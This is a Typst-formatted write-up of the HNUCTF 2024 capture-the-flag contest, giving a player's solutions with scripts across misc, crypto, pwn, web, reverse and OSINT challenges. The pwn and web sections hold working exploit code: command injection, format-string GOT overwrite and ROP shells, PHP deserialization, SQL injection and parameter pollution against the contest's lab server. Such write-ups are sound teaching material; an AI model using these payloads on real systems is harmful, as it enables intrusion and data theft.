#import "@preview/showybox:2.0.3": showybox

// 页面
#set page(margin: (x: 4em, y: 4em), height: auto)

// 段落
#set par(justify: true, leading: 1em)

// 文字
#set text(lang: "zh", size: 12pt, font: ("Noto Sans", "Noto Sans CJK SC", "Noto Color Emoji"))
#show text.where(weight: "bold").or(strong): set text(weight: 600)

// 标题
#show heading.where(level: 1): set text(size: 1.5em)
#show heading.where(level: 2): set text(size: 1.25em)
#show heading.where(level: 3): set text(size: 1.1em)

// 代码
#show raw: set text(font: "Monaspace Neon")
#show raw.where(block: false): set text(size: 1.2em)
#show raw.where(block: true): set text(size: 0.9em)

#show raw.where(block: true): content => [
    #showybox(
    frame: (
        border-color: blue,
        thickness: (left: 1pt),
        radius: 0pt
    ),
    )[
        #v(0.4em)
        #content
        #v(0.4em)
    ]
]

#let flag = content => [
    #set align(center)
    #showybox(
        title-style: (
            boxed-style: (
                anchor: (x: center, y: horizon),
                radius: (top-left: 8pt, bottom-right: 8pt, rest: 0pt),
            )
        ),
        frame: (
            title-color: green.darken(30%),
            body-color: green.lighten(90%),
            footer-color: green.lighten(70%),
            border-color: green.darken(60%),
            radius: (top-left: 10pt, bottom-right: 10pt, rest: 0pt)
        ),
        title: [*Flag*],
    )[
        #place(center + horizon, text(size: 1em, raw(content)))
        #v(2em)
    ]
]

// 定制
#show link: underline
#show link: set text(fill: blue)

#show heading.where(level: 2): content => [
    #line(length: 100%, stroke: black.transparentize(80%))
    #content
]

#show heading.where(level: 3): content => [
    #v(1em)
    // #text(size: 0.6em, baseline: -0.25em)[$triangle.filled.r$] #h(0.2em) #box[#content]
    #text(size: 1em)[🔑️] #box[#content]
    #hide("")
]

= HNUCTF 2024 Write-ups

#v(1em)

- 选手信息：996社畜大队 - Mufanc
- 排名：3

#image("images/AK.png")

== Misc 🎮️

=== Bob_traffic

题目给了个 pcap 包，看起来是要在里边找 flag，但其实不用装 Wireshark，可以直接 strings 出来： 

```sh
> strings Bob_traffic.pcap | grep HNUCTF
User-Agent: HNUCTF{pcGpngac_pture_raffic}
```

#flag("HNUCTF{pcGpngac_pture_raffic}")

=== Help_Jack

用 wave 库读出 frames 数据，取得 lsb 位后按照 8 位一组重新合成 `bytes`，输出即可：

```python
import wave

handle = wave.open("Miriam.wav", mode='rb')
frames = bytearray(handle.readframes(handle.getnframes()))
lsb = [int(x & 1) for x in frames][:500]

arr = []

for i in range(0, len(lsb), 8):
    ch = int(''.join(map(str, lsb[i : i + 8])), 2)
    arr.append(ch)

print(bytes(arr))
```

=== Tetris

小时候玩 pvz 没少干这事，起手先搜一个 0，得分以后搜索新的分值，重复这个过程，直到只剩少数几个结果，将值改为 10000 后自杀即可：

#image("images/Tetris/CE.png")

#image("images/Tetris/gameover.png")

#align(right)[
    #v(-0.5em)
    #text(size: 2pt, fill: black.transparentize(50%))[看不见我看不见我看不见我]
    #v(-0.5em)
]

#flag("HNUCTF{#31c0m3_t0_HN#CtF_2024_eX1JT0O1}")

=== git_leak

既然 `.git` 文件夹都传上来了，直接 reset 回添加 flag 的那次提交，再 `cat flag.txt` 即可：

```sh
> git reflog
5d2c607 (HEAD -> master) HEAD@{0}: commit: Updated flag.txt
7ed5900 HEAD@{1}: commit: Added flag.txt
52c408d HEAD@{2}: commit: Updated README
a105064 (origin/master, origin/HEAD) HEAD@{3}: checkout: moving from flag to master
b3dc4aa (flag) HEAD@{4}: checkout: moving from a1b95f1616d51b4ac14135d81d190c5e40b809bb to flag
a1b95f1 HEAD@{5}: commit: Updated README
ade22e9 HEAD@{6}: commit: Updated README
a105064 (origin/master, origin/HEAD) HEAD@{7}: checkout: moving from b3dc4aac9c80c97925c1239e6e8dbf2e1f82de4b to a105064770f3454d168c2c5cf5c0763fb7d5f6e3
b3dc4aa (flag) HEAD@{8}: rebase (start): checkout flag
e3f0729 HEAD@{9}: commit: Edited README
a105064 (origin/master, origin/HEAD) HEAD@{10}: checkout: moving from flag to a105064770f3454d168c2c5cf5c0763fb7d5f6e3
b3dc4aa (flag) HEAD@{11}: commit: Added flag
5e0c598 HEAD@{12}: commit: Edited README
a105064 (origin/master, origin/HEAD) HEAD@{13}: checkout: moving from master to flag
a105064 (origin/master, origin/HEAD) HEAD@{14}: clone: from https://github.com/firmianay/CTF-All-In-One.git

> git reset --hard b3dc4aa
caHEAD is now at b3dc4aa Added flag

> cat flag.txt
HNUCTF{y0u_h4ve_f1nd_th3_g1t_l34k}
```

P.S. 其实是 Hackergame 2023 的原题，参考：#link("https://github.com/USTC-Hackergame/hackergame2023-writeups/blob/master/official/Git%20Git!/README.md")[传送门]

#flag("HNUCTF{y0u_h4ve_f1nd_th3_g1t_l34k}")

=== 新佛经

文件内容解析成数组以后 base64 解码 + 凯撒密码解密，没什么好说的：

```python
from base64 import b64decode


def caesar(ciphertext, shift):
    result = []

    for ch in ciphertext:
        if ch.isalpha():
            shift_amount = shift % 26

            if ch.islower():
                start = ord('a')
            else:
                start = ord('A')

            orig = chr(start + (ord(ch) - start - shift_amount) % 26)
            result.append(orig)
        else:
            result.append(ch)

    return ''.join(result)


cipher = open('The_buddha_say.txt').read().strip()
string = b64decode(bytes(int(x, 16) for x in cipher.split())).decode()

print(caesar(string, 4))
```

#flag("HNUCTF{w3_N3ed_mKR3_E0cdPn9}")

=== 签到

flag 都甩脸上了，同样没什么好说的：

#image("images/sign_in/flag.png")

#flag("HNUCTF{Welcome_to_HNUCTF2024!}")

=== 网络鲨鱼

直接 strings 看：

```sh
> strings shark.pcap | grep HNUCTF
```

只有一堆意义不明的 URL …… 似乎没有什么有效信息。所以这题就 strings 不出来了……吗？考虑到出题人可能也会想到有人用 strings 查，于是搜一下 base64 编码的 prefix：

```sh
> strings shark.pcap | grep $(echo 'HNUCTF' | base64 | head -c 4)
GET http://192.168.3.4/SE5VQ1RGe3cxcjNzaDRya180bjRseXMxc30K HTTP/1.1
```

果然得到了一个 URL，将 path 部分解码即可得到 flag

#flag("HNUCTF{w1r3sh4rk_4n4lys1s}")

== Crypto 🔐️  

=== Buddha

在 #link("https://ctf.bugku.com/tool/todousharp")[这个网站] 解码一下：

#image("images/Buddha/decode.png")

然后 base64 再解一次，即可得到 flag：

#flag("HNUCTF{buddha_d1ab8baf-9694-420b-b234-e76e80c2fd79}")

=== ebg13

Google 直接搜索 EBG13，发现是一种名为 ROT13 的替换式密码，先 base64 解码，再找个网站解密下即可：

#image("images/ebg13/decode.png")

#flag("HNUCTF{rot_is_fun_ea1f2cac-b89f-452e-976d-4b7160dd7be8}")

=== ez_rsa

脚本中直接暴露了 p、q 和 e，可以利用它们计算私钥 d，使用私钥解密即可：

```python
from gmpy2 import invert
from binascii import unhexlify

# 给定的参数
p = 0xED7FCFABD3C81C78E212323329DC1EE2BEB6945AB29AB51B9E3A2F9D8B0A22101E467
q = 0xAD85852F9964DA87880E48ADA5C4487480AA4023A4DE2C0321C170AD801C9
e = 65537

# 这里 eval 只是为了换行
c = eval('0x863e2c635c3d0358f5a0c392ed47c9636b17179417b4549fd40d3b22d35eba'
         '77520bdee84879b3b49f734bb0d0caa2a26619d0ecaaadeab104f53ce481c919d1b4')

# 计算 n 和 φ(n)
n = p * q
phi_n = (p - 1) * (q - 1)

# 计算私钥 d
d = invert(e, phi_n)

# 解密密文
m = pow(c, d, n)
plaintext = unhexlify(hex(m)[2:])

print(plaintext)

```

#flag("HNUCTF{rsa_is_fun_fa064411-2c6c-4daa-b2a1-2107640d3f9a}")

== Pwn 💣️

=== Command Injection

题目环境疑似直接在 Shell 里面 echo 了用户输入的内容，那么用一个命令替换表达式打印 `/flag` 即可：

```python
from pwn import *

r = remote('129.204.78.34', 20448)
r.sendline(b'$(cat /flag)')

print(r.recvline())
```

#flag("HNUCTF{u_have_completed_the_command_injection_72bcfc07a1f3}")

=== chars

这也许是一个非预期解（？

将程序拖入 Ghidra 反编译，注意到有一个 backdoor 函数，里边直接执行了 ```c system("/bin/sh")```，还有一个 repeater 函数，会将用户输入直接 printf 出来：

#image("images/chars/backdoor.png")

#image("images/chars/repeater.png")

题目提示是 canary，感觉预期解法应该是设法从这个 `printf` 读出 canary 值，再利用某处的缓冲区溢出漏洞修改返回地址跳转到 `backdoor`。但可惜这个程序是非 PIE 的，于是我们可以直接用 GOT hook 把 `puts` 劫持到 `backdoor`，完全没必要理会什么 canary：

```python
from pwn import *

f = ELF('chars')

# r = process(['./chars'])
r = remote('129.204.78.34', 20787)
r.sendline(b'1')

sleep(1)

# r.sendline(b'AAAABBBB' + b'%x.' * 10)
# r.interactive()

payload = fmtstr_payload(6, {
    f.got['puts']: f.symbols['backdoor'],
})

r.sendline(payload)
r.sendline(b'cat /flag')

print(r.recvline_contains(b'HNUCTF'))
```

#flag("HNUCTF{601535f0-5d18-4958-a0ce-59e96a8e5df0}")

=== rop

反编译，注意到 `hello` 函数里边用的 ```c int``` 来存字符串长度，而 `my_gets` 里边用的是 ```c uint```，所以直接输入 `-1` 就可以绕过长度限制

#image("images/rop/hello.png")

下边有一个函数 `hint`，点进去以后发现有一个 ```c system("echo ...")``` 和一个 ```c "/bin/sh"``` 字符串。再观察调用约定，参数是栈上传递的，于是直接栈溢出修改参数返回地址，用 ```c "/bin/sh"``` 作为参数调用 `system`，即可拿到 Shell：

```python
from pwn import *

# r = process(['./rop-release'])
r = remote('129.204.78.34', 20606)

r.sendline(b'-1')
r.sendline(b'.' * 28 + b'\x08\x04\x92\x76'[::-1] + b'\x08\x04\xa0\x2b'[::-1])

print(r.recvline())
print(r.recvline())

r.sendline(b'cat /flag')
print(r.recvline())
```

#flag("HNUCTF{aa2c003d-f6b2-477d-97da-945c5c4b6a42}")

== Web 🌐

=== Why So Serious?

观察代码，我们的目的是构造一个 `cls1` 对象，成员 `cls` 指向一个 `cls2` 对象，且 `arr` 的一个值是 ```c 'fileput'```，其中 `cls2` 对象的 `filename` 值又等于 ```c '/flag'```，这样在反序列化时就会读取并显示文件 `/flag` 的内容了：

```php
<?php
class cls1 {
    var $cls;
    var $arr = array(0 => 'fileput');

    function __construct() {
        $this->cls = new cls2();
    }
}

class cls2 {
    var $filename = '/flag';
    var $txt = '';
}

$instance = new cls1();
echo serialize($instance);
?>
```

```python
import httpx
from base64 import b64encode

payload = 'O:4:"cls1":2:{s:3:"cls";O:4:"cls2":2:{s:8:"filename";s:5:"/flag";s:3:"txt";s:0:"";}s:3:"arr";a:1:{i:0;s:7:"fileput";}}'

resp = httpx.get('http://129.204.78.34:20617', params={
    'ser': b64encode(payload.encode()).decode()
})

print(resp.text)
```

#flag("HNUCTF{why_so_serious_db964029-6033-4aec-a1b8-71bde70d56cf}")

=== bank

使用不同的输入测试服务端逻辑，可以发现服务端是按照下面的顺序进行检查的：

```
assert sender != receiver && receiver != "hacker"
assert amount > 0
assert sender in { dict }
assert receiver in { dict }
assert money[sender] >= amount
```

那么我们尝试在请求参数最后再附加一个 `receiver=hacker`，或许就可以覆盖掉实际的接收方：

```python
import httpx
import re

URL = 'http://129.204.78.34:20805/'


class Builder(object):
    def __init__(self, url):
        self.client = httpx.Client()
        self.url = url
        self.params = []

    def add_param(self, key, value):
        self.params.append((key, value))

    def run(self):
        query = self.url + '?' + '&'.join('='.join(pair) for pair in self.params)
        resp = self.client.get(query)
        self.params.clear()

    def steal(self, target, amount):
        self.add_param('sender', target)
        self.add_param('receiver', 'l1uyun' if target != 'l1uyun' else 'dragon')
        self.add_param('amount', str(amount))
        self.add_param('receiver', 'hacker')
        self.run()

    def check(self):
        resp = self.client.get(self.url)
        print(re.findall(r'你的当前余额是：\d+', resp.text)[0])
        print(re.findall(r'<td>(.+?)</td><td>(.+?)</td>', resp.text))


builder = Builder(URL)

builder.steal('l1uyun', 2300)
builder.steal('eagle', 2430)
builder.steal('tiger', 4250)
builder.steal('dragon', 3570)
builder.steal('phoenix', 2650)
builder.steal('wolf', 2640)

builder.check()

print(builder.client.cookies)
```

抢光银行以后卡了挺久，最后发现要请求一下 `/admin`，才能拿到 flag

#flag("HNUCTF{bank_3a724bb1-b22b-4d93-88b7-d0a3893344e0}")

=== ez_cmdi

同样是简单题，截断命令以后读 `/flag` 即可：

```python
import httpx

resp = httpx.post('http://129.204.78.34:20461/', data={
    'ip': '; cat /flag'
})

print(resp.text)
```

#flag("HNUCTF{ping_command_598fa6bd-865f-4582-b74e-bcd16706bf72}")

=== ez_serialize

参考前面 Why So Serious? 的思路，构造一个 `cat /flag` 的命令即可：

```python
import httpx
from base64 import b64encode


def exec_shell(command: str):
    payload = f'O:5:"mycmd":1:{{s:3:"cmd";s:{len(command)}:"{command}";}}'

    resp = httpx.post('http://129.204.78.34:20518/', data={
        'data': b64encode(payload.encode()).decode()
    })

    resp = resp.text
    split = '</code>'

    print(resp[resp.find(split) + len(split):])


exec_shell('cat /flag')
```

#flag("HNUCTF{easy_serialize_3c5a9c35-6785-4fcd-8c18-240cb57b412f}")

=== ez_sqli

习惯性先试试最基础的 payload，没想到一发入魂：

```python
import httpx

resp = httpx.post('http://129.204.78.34:20571/', data={
    'username': 'admin\' or 1=1 --',
    'password': 'admin',
})

print(resp.text)
```

#flag("HNUCTF{SQL_iNJECTor_20958f14-4f58-4efa-9190-1c08cb461890}")

=== md5

可以使用数组绕过，因为 php 的 `md5()` 不能处理数组，一律返回 ```java null```，所以可以触发内容不同但 md5 相同的 case：

```python
import httpx

resp = httpx.post('http://129.204.78.34:20378/', params={
    'name[]': 'HNU',
}, data={
    'password[]': 'CTF',
})

print(resp.text)
```

#flag("HNUCTF{easy_md5_b33a7ee1-ace5-4df3-9171-a463f75e76bb}")

=== md5_again

观察题目代码，这把开局直接转 `string`，没法继续用数组绕过了，md5 比较的时候也是用的 `===`，所以我们也没有 `0e` 魔法，只能考虑正经碰撞了。在 #link("https://github.com/spaze/hashes?tab=readme-ov-file#real-collisions")[这个仓库] 找到一个可用示例：

```python
import httpx

resp = httpx.post('http://129.204.78.34:20370/', data={
    'name': 'TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak',
    'password': 'TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak'
})

print(resp.text)
```

#flag("HNUCTF{md5_again_06d3fec7-c9e2-4989-9b2f-fc3c383087dd}")

== Reverse ⏪

=== ez_reverse1

这是一个 stripped 二进制，使用 Ghidra 反编译，重点关注 `.text` 段，有一个输出了「Crack me!」的入口函数，还有一个输出了「Here is flag!」的函数，然而入口中没调用这个打 flag 的函数，所以咱们得帮它调用，直接劫持 `getchar` 过去即可：

```c
#define getchar getchar_orig

#include <stdio.h>
#include <stdint.h>

#undef getchar

void getchar() {
    uintptr_t return_address = (uintptr_t) __builtin_return_address(0);
    ((void (*)())(return_address + 0x001011b9 - 0x001010bd))();
}
```

编译为动态库，然后用 `LD_PRELOAD` 注入：

```sh
clang hack.c -fPIC -shared hack.so
LD_PRELOAD=./hack.so ./reverse1
```

#flag("HNUCTF{W3lcome_t0_HNUCTF}")

=== ez_reverse2

反编译，注意到有个 flag 函数，猜测是用来解密 flag 的：

#image("images/ez_reverse2/flag.png")

但是懒得分析具体逻辑了，遂挂 lldb，函数跑完以后 dump 堆栈内存，通过 strings 找出来解密结果：

```python
from pwn import *

p = process(['lldb', './reverse2'])
sleep(0.1)
p.sendline(b'breakpoint set -n flag')
sleep(0.1)
p.sendline(b'run')
sleep(0.1)
p.sendline(b'thread step-out')
sleep(0.1)
p.sendline(b'thread info')

p.recvuntil(b'tid = ')
pid = int(p.recvuntil(b',', drop=True))


fp = open(f'/proc/{pid}/maps', 'r')
lines = map(lambda line: line.split(), fp.readlines())
maps = { line[-1]: line[0] for line in lines }


def dump(key):
    addrs = [int(x, 16) for x in maps[f'[{key}]'].split('-')]

    fp = open(f'/proc/{pid}/mem', 'rb')
    fp.seek(addrs[0])

    mem = fp.read(addrs[1] - addrs[0])

    file = open(f'{key}.bin', 'wb')
    file.write(mem)


dump('heap')
dump('stack')
```

```sh
> strings *.bin | grep -E 'HNUCTF{.*}'
HNUCTF{We1cowe_t0_1he_r3v3r5e_d1rec71On}A
```

#flag("HNUCTF{We1cowe_t0_1he_r3v3r5e_d1rec71On}")

=== maze1

建议出题人下次用 UTF-8 编码，这玩意对 wine 用户不太友好（

反编译，注意到每走一步之后都会调用一个 `is_valid` 函数判断当前位置是否合法，如果不合法则退出程序。除了基础的范围限定，还通过一个字节数组 `maze` 添加了一些额外限定：

#image("images/maze1/is_valid.png")

那么我们可以将这个 maze 数组提取出来，仿照它的逻辑对每一个位置进行合法性判断，便可以还原出完整的地图：

```cpp
#include <cstdio>

// 提取的 maze 数据
unsigned char maze[] = "\x00\x00\x00\x00\x00\x00\x00 ...";  

int main() {
    for (int x = -1; x < 11; x++) {
        for (int y = -1; y < 11; y++) {
            bool ok = 1;

            if ((((x < 0) || (9 < x)) || (y < 0)) || (9 < y)) {
                ok = 0;
            } else if (*(int *)((long) maze + ((long) x * 10 + (long) y) * 4) == 1) {
                ok = 0;
            } else {
                ok = 1;
            }

            if (ok) {
                printf(".");
            } else {
                printf("#");
            }
        }
        printf("\n");
    }

    return 0;
}
```

（为什么没有 2226，可恶……）

#align(center, image("images/maze1/2226.png", width: 25%))

#flag("HNUCTF{662266886622224226266226}")

== AI 🤖️

=== FGSM

感觉判题脚本有点弱啊…… 附件代码完全不需要看，随便开一个图像编辑软件，把 1 涂改成 2，提交！

#image("images/FGSM/krita.png")

#flag("HNUCTF{N1c3_a9ainst_s4mp1e_Attack}")

== OSINT 🔍️

=== here is!

图中右侧栈道上写着「灵秀聚□人莫识，虎踞龙盘□□□」几个字，Google 搜索后不难发现这里是韶山景区，其中收费景点只有滴水洞一个，门票价格是 40 块钱：

#align(center, image("images/here_is/ticket.png", width: 50%))

#flag("HNUCTF{dishuidong_O3!nT_40.00} ")

=== see_see_need

（烟雾弹是真多）

图中一共出现了 3 位出题人：l1uyun、kongyu204 和 comgoogle，分别搜出来：

- L1uYun：`https://github.com/L1uYun/l1uyun_blog/tree/pages`

直接 clone 仓库，搜出来第一个烟雾弹……

```
l1uyun_blog/posts/reading/index.html
207:        <p>HNUCTF{os1nt_1s_fun}</p>
```

- ComGoogle：`https://github.com/ComGoogle/ComGoogle.github.io/tree/doc`

这里搜出来第二个烟雾弹

```
about-me-1b4752.html
106: ... <span class="SemanticString">想HNUCTF{fake_flag}</span> ...
```

- Kongyu204：`https://www.kongyu204.com/`

这位没找到 GitHub 仓库，但好在博客自带搜索：

#align(center, image("images/see_see_need/kongyu204.png", width: 80%))

#flag("HNUCTF{OSINT_leads_to_flag}")

=== where_are_i!

一开始没看到右下角 3 号线地铁标，以为是磁浮快线，白找了好久……

确定了 3 号线以后在线路上搜索，发现有个大王山云巴正是这造型，车上 logo 也可以验证（之前完全没看出来车上印的啥字……）

去 B 站搜索视频，找到一个 #link("https://www.bilibili.com/video/BV1Zg4y1o74n/")[第一视角全程 POV]，此外，视频开头 00:10 出出现的路口正是图中路口：

#image("images/where_are_i/cross.png")

（非常好视频，使我的 flag 旋转）

#image("images/where_are_i/location.png")

#flag("HNUCTF{112.924_28.096_Os!nT}")

=== where_are_i_again!

图中可以看到一个 21 号站台，通过开点和车次号可以很容易找到这里是南京南站

至于「20 站台下一趟将要进站的车」，可以看到 21 号隔壁站台正好有一辆「□□75」次车即将进站，由于站台标号是连续的，这个站台不是 20 就是 22，同样 #link("https://www.bilibili.com/video/BV1Ru4m1F7uu/")[搜索视频验证]，可知这个被截断的站台正是 20 号，

#stack(dir: ltr)[
    #image("images/where_are_i_again/1.jpg", width: 33.3%)
][
    #image("images/where_are_i_again/2.jpg", width: 33.3%)
][
    #image("images/where_are_i_again/3.jpg", width: 33.3%)
]


#flag("HNUCTF{0siN7_G7674_nanjingnan}")
